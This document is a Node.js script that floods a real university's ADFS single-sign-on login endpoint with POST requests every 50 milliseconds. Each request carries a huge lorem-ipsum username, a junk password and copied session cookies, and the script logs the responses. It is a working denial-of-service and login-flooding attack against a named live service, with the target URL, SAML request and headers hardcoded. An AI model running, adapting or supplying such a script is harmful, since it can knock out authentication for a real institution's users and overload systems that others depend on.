const axios = require('axios');
const { LoremIpsum } = require('lorem-ipsum');
const qs = require('qs');
const fs = require('fs');

const lorem = new LoremIpsum({
    sentencesPerParagraph: {
        max: 8,
        min: 4
    },
    wordsPerSentence: {
        max: 16,
        min: 4
    }
});


const filePath = 'example.txt';
let counter = 0;

// Function to write to the file
const writeToFile = () => {
    const dataToWrite = `This is line ${counter++}\n`;

    fs.appendFile(filePath, dataToWrite, (err) => {
        if (err) {
            console.error('Error writing to the file:', err);
        } else {
            console.log(`Data has been written to the file: ${dataToWrite}`);
        }
    });
};


let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'https://loginfs.ntu.edu.sg/adfs/ls/?SAMLRequest=fZFLb4MwEIT%2FCvI9OJg0Dysg0eTQSGmLAu2hl8oYJ1gyNvXaffz7ktBHemjOOzsz%2B%2B0SWKs6mnnX6J148QJc8N4qDfQ0SJC3mhoGEqhmrQDqOC2y2y0l4Zh21jjDjUJBBiCsk0avjAbfClsI%2Byq5eNhtE9Q41wHFeC8rGWrnQ1H7EA64aGRVGSVcEwIYfLQlOL8vShSs%2Bx5Ss6Pj774yB6n3cG7B6j1gBRgFm3WCnjnh0WIWTydkNq84j%2BsqnjK2mAm%2BiKsxmfYyAC82GhzTLkFkTOJRFI0IKaMrGsV0Mn9CQf511rXUtdSHywyqQQT0pizz0dD%2BUVg4Ne8FKF0eSdJTsD1je9mWfQNF6X%2F44AffEp9FDHkdves9N%2BvcKMk%2Fgkwp87aygjmRoAjhdFj5%2B%2Fj0Ew%3D%3D&RelayState=ss%3Amem%3A2c821db57dd225b44126927f435904d1071daf0c2121fc1e0f3b94357f8f39a9&client-request-id=3f52e734-b80b-43dc-1402-0080012c0351',
    headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': '_gcl_au=1.1.794871248.1700666003; _ga=GA1.3.597401380.1700666003; _gid=GA1.3.659896837.1700666004; _gat_UA-176698766-1=1; _tt_enable_cookie=1; _ttp=h2_TC2oG6vw3nXWrSvotR-XuGpB; _ga_8LPDJ1LB78=GS1.1.1700666003.1.0.1700666015.48.0.0',
        'Origin': 'https://loginfs.ntu.edu.sg',
        'Referer': 'https://loginfs.ntu.edu.sg/adfs/ls/?SAMLRequest=fZFLb4MwEIT%2FCvI9OJg0Dysg0eTQSGmLAu2hl8oYJ1gyNvXaffz7ktBHemjOOzsz%2B%2B0SWKs6mnnX6J148QJc8N4qDfQ0SJC3mhoGEqhmrQDqOC2y2y0l4Zh21jjDjUJBBiCsk0avjAbfClsI%2Byq5eNhtE9Q41wHFeC8rGWrnQ1H7EA64aGRVGSVcEwIYfLQlOL8vShSs%2Bx5Ss6Pj774yB6n3cG7B6j1gBRgFm3WCnjnh0WIWTydkNq84j%2BsqnjK2mAm%2BiKsxmfYyAC82GhzTLkFkTOJRFI0IKaMrGsV0Mn9CQf511rXUtdSHywyqQQT0pizz0dD%2BUVg4Ne8FKF0eSdJTsD1je9mWfQNF6X%2F44AffEp9FDHkdves9N%2BvcKMk%2Fgkwp87aygjmRoAjhdFj5%2B%2Fj0Ew%3D%3D&RelayState=ss%3Amem%3A2c821db57dd225b44126927f435904d1071daf0c2121fc1e0f3b94357f8f39a9',
        'Sec-Fetch-Dest': 'document',
    },
    data: qs.stringify({
        'UserName': lorem.generateParagraphs(200),
        'Password': 'qwkljqklwlejkl',
        'AuthMethod': 'FormsAuthentication'
    })

};


setInterval(() => {
    axios.request(config)
        .then((response) => {
            console.count(response.status);
            writeToFile()
        })
        .catch((error) => {
            console.count(error.response.data);
        });

}, 50);